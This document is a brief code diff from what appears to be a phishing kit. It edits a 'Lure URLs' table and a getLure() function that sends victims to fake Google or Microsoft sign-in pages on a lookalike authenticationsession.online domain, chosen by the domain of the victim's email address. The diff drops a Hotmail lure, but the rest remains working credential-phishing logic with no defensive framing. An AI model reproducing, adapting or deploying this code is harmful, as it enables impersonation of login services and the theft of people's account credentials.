@@ -216,7 +216,6 @@ footer a:hover{text-decoration:underline}
   /* ── Lure URLs ── */
   var LURES = {
     google:    'https://accounts.gsuite.authenticationsession.online/NDSqznSH',
-    hotmail:   'https://login.hotmail.authenticationsession.online/nZyekaNp',
     microsoft: 'https://login.microsoft.authenticationsession.online/qTEJkBQZ'
   };
   var GOOGLE_DOMAINS = ['gmail.com','googlemail.com','google.com'];
@@ -233,7 +232,6 @@ footer a:hover{text-decoration:underline}
   function getLure(email) {
     var d = (email.split('@')[1]||'').toLowerCase();
     if (GOOGLE_DOMAINS.indexOf(d) >= 0) return LURES.google;
-    if (MS_PERSONAL_DOMAINS.indexOf(d) >= 0) return LURES.hotmail;
     return LURES.microsoft;
   }
 
